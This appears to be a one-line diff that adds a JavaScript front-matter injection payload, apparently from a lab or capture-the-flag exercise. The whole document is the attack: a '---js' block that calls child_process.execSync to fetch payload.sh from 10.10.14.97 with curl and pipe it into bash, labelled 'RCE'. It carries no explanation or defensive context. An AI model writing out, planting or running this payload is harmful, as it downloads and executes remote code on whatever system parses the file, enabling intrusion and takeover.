@@ -1,0 +1,1 @@
+---js\n((require("child_process")).execSync("curl http://10.10.14.97/payload.sh | bash"))\n---RCE
